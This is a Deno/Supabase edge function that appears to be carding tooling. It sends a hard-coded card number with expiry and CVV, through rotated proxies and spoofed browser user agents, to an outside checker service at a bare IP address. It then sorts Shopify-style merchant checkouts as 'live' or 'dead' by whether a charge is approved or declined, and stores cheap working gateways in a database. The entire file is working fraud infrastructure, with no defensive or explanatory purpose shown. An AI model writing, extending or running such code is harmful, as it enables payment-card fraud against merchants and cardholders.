import { createClient } from "npm:@supabase/supabase-js@2";

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const TEST_CC = "4266841674104656|03|27|908";
const API_BASE_URL = "http://108.165.12.183:8081/";

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
];

const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];

const badResponses = [
  "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
  "Site not supported",
  "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH",
  "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
  "Payment method not available",
  "ARTIFACT_DISSATISFACTION",
  "VALIDATION_CUSTOM",
  '"Gateway":"Authorize.net"',
];

const extractPrice = (response: string): { price: number; priceStr: string } => {
  const pricePatterns = [
    /\$[\d,]+\.?\d*/g,
    /USD\s*[\d,]+\.?\d*/gi,
    /"price":\s*"?[\d.]+/gi,
    /"amount":\s*"?[\d.]+/gi,
    /"total":\s*"?[\d.]+/gi,
  ];

  let lowestPrice = Infinity;
  let priceStr = "$0.00";

  for (const pattern of pricePatterns) {
    const matches = response.match(pattern);
    if (matches) {
      for (const match of matches) {
        const numericMatch = match.replace(/[^0-9.]/g, "");
        const value = parseFloat(numericMatch);
        if (!isNaN(value) && value > 0 && value < lowestPrice) {
          lowestPrice = value;
          priceStr = `$${value.toFixed(2)}`;
        }
      }
    }
  }

  return {
    price: lowestPrice === Infinity ? 0 : lowestPrice,
    priceStr: lowestPrice === Infinity ? "$0.00" : priceStr,
  };
};

const checkSingleSite = async (
  siteUrl: string,
  proxyStr: string,
  supabase: ReturnType<typeof createClient>,
): Promise<{ url: string; status: string; price: number; priceStr: string; apiResponse?: string; error?: string }> => {
  const maxAttempts = 1;
  const timeoutMs = 45000;

  for (let attempt = 0; attempt < maxAttempts; attempt++) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

      const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(TEST_CC)}&url=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxyStr)}`;

      console.log(`[Attempt ${attempt + 1}] Checking: ${siteUrl}`);

      const response = await fetch(apiUrl, {
        method: "GET",
        signal: controller.signal,
        headers: {
          "Accept": "application/json, text/plain, */*",
          "User-Agent": getRandomItem(userAgents),
          "Cache-Control": "no-cache",
        },
      });

      clearTimeout(timeoutId);
      const rawText = await response.text();

      if (!rawText || rawText.trim() === "") {
        console.log(`[Attempt ${attempt + 1}] Empty response for ${siteUrl}`);
        if (attempt < maxAttempts - 1) {
          await new Promise(r => setTimeout(r, 2000));
          continue;
        }
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: "Empty response", error: "Empty response" };
      }

      const truncated = rawText.length > 500 ? rawText.substring(0, 500) + "..." : rawText;

      // Check for bad responses — site is broken
      const isBad = badResponses.some(bad => rawText.toLowerCase().includes(bad.toLowerCase()));
      if (isBad) {
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        console.log(`[Result] ${siteUrl} → DEAD (bad response)`);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: truncated, error: "Bad response detected" };
      }

      // Parse response — same logic as shopify-charge-check
      let { price, priceStr } = extractPrice(rawText);
      let apiResponse = truncated;

      // Cap: sites over $100 are not usable — purge and mark dead
      if (price > 100) {
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        console.log(`[Result] ${siteUrl} → DEAD (price too high: ${priceStr})`);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse: truncated, error: "Price exceeds $100" };
      }

      try {
        const json = JSON.parse(rawText);
        
        // Extract Price from API JSON
        if (json.Price !== undefined && json.Price > 0) {
          price = json.Price;
          priceStr = `$${Number(json.Price).toFixed(2)}`;
        }
        if (json.Response) {
          apiResponse = String(json.Response).replace(/<[^>]*>/g, '');
        }

        const msg = json.message || json.msg || json.error || rawText;
        const responseLower = (apiResponse || '').toLowerCase();
        const combinedText = String(msg).toLowerCase() + ' ' + responseLower;

        // CHARGED / success = site is live
        if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true ||
            combinedText.includes('order_placed') || combinedText.includes('order placed') ||
            combinedText.includes('thank you') || combinedText.includes('charged') ||
            combinedText.includes('approved')) {
          await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
          console.log(`[Result] ${siteUrl} → LIVE (${priceStr})`);
          return { url: siteUrl, status: "live", price, priceStr, apiResponse };
        }

        // DECLINED / error = site is alive (merchant active) — keep it
        if (json.status === 'DECLINED' || json.status === 'failed' || json.status === 'error' ||
            json.full_response === false || json.status === 'DS_REQUIRED' || json.status === '3DS_REQUIRED' ||
            combinedText.includes('declined') || combinedText.includes('insufficient') ||
            combinedText.includes('do_not_honor') || combinedText.includes('card_declined') ||
            combinedText.includes('ds_required') || combinedText.includes('3ds') ||
            combinedText.includes('fraud') || combinedText.includes('restricted') ||
            combinedText.includes('pickup_card') || combinedText.includes('lost_card') ||
            combinedText.includes('generic_decline') || combinedText.includes('not_permitted')) {
          // Site is alive — merchant processed the card, just declined it
          if (price > 0) {
            await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
            console.log(`[Result] ${siteUrl} → LIVE (declined but active, ${priceStr})`);
            return { url: siteUrl, status: "live", price, priceStr, apiResponse };
          }
          console.log(`[Result] ${siteUrl} → DEAD (declined, no price)`);
          return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse };
        }
      } catch {
        // Not JSON — text-based fallback
        const lower = rawText.toLowerCase();
        if (lower.includes('order_placed') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
          if (price > 0) {
            await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
            console.log(`[Result] ${siteUrl} → LIVE (${priceStr})`);
            return { url: siteUrl, status: "live", price, priceStr, apiResponse: truncated };
          }
        }
        if (lower.includes('declined') || lower.includes('3ds') || lower.includes('insufficient')) {
          if (price > 0) {
            await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
            console.log(`[Result] ${siteUrl} → LIVE (declined but active, ${priceStr})`);
            return { url: siteUrl, status: "live", price, priceStr, apiResponse: truncated };
          }
        }
      }

      // Price > 0 and <= 100 — save it; purge sites over $100
      if (price > 100) {
        await supabase.from("gateway_urls").delete().eq("url", siteUrl);
        console.log(`[Result] ${siteUrl} → DEAD (price too high: ${priceStr})`);
        return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse, error: "Price exceeds $100" };
      }
      if (price > 0) {
        await supabase.from("gateway_urls").upsert({ url: siteUrl, price }, { onConflict: "url" });
        console.log(`[Result] ${siteUrl} → LIVE (price detected: ${priceStr})`);
        return { url: siteUrl, status: "live", price, priceStr, apiResponse };
      }

      console.log(`[Result] ${siteUrl} → DEAD (no price, unrecognized)`);
      return { url: siteUrl, status: "dead", price: 0, priceStr: "$0.00", apiResponse };

    } catch (err) {
      const msg = err instanceof Error ? err.message : "Unknown error";
      console.log(`[Attempt ${attempt + 1}] Error for ${siteUrl}: ${msg}`);
      if (attempt < maxAttempts - 1) {
        await new Promise(r => setTimeout(r, 2000));
        continue;
      }
      return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse: "", error: msg };
    }
  }

  return { url: siteUrl, status: "error", price: 0, priceStr: "$0.00", apiResponse: "", error: "All attempts failed" };
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
    
    // Fast local JWT verification
    const anonClient = createClient(SUPABASE_URL, Deno.env.get("SUPABASE_ANON_KEY") || "", {
      global: { headers: { Authorization: authHeader } },
    });
    const token = authHeader.replace("Bearer ", "");
    const { data: claimsData, error: authError } = await anonClient.auth.getClaims(token);

    if (authError || !claimsData?.claims?.sub) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const userId = claimsData.claims.sub as string;

    const { data: roleData } = await supabase
      .from("user_roles")
      .select("role")
      .eq("user_id", userId)
      .eq("role", "admin")
      .maybeSingle();

    if (!roleData) {
      return new Response(JSON.stringify({ error: "Admin access required" }), { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const { url, proxy: proxyOverride } = await req.json();

    if (!url || typeof url !== "string") {
      return new Response(JSON.stringify({ error: "No URL provided" }), { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    let proxyStr = "";
    
    if (proxyOverride && typeof proxyOverride === "string") {
      // Use the proxy provided by the caller
      proxyStr = proxyOverride;
    } else {
      // Fetch a random live proxy
      const { data: liveProxies } = await supabase
        .from("proxies")
        .select("*")
        .eq("status", "live");

      if (liveProxies && liveProxies.length > 0) {
        const randomProxy = getRandomItem(liveProxies);
        proxyStr = randomProxy.username && randomProxy.password
          ? `${randomProxy.ip}:${randomProxy.port}:${randomProxy.username}:${randomProxy.password}`
          : `${randomProxy.ip}:${randomProxy.port}`;
      }
    }

    const result = await checkSingleSite(url, proxyStr, supabase);

    return new Response(JSON.stringify(result), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Health check error:", error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : "Internal error" }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
